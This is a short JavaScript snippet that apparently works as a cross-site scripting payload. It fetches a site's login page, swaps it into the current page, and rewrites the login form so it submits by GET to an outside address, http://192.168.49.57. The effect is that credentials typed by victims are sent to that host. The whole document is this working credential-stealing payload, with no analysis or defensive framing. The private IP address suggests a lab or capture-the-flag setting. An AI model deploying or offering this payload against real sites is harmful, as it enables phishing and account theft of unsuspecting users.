fetch("login").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://192.168.49.57"
	document.getElementsByTagName("form")[0].method = "get"
}))
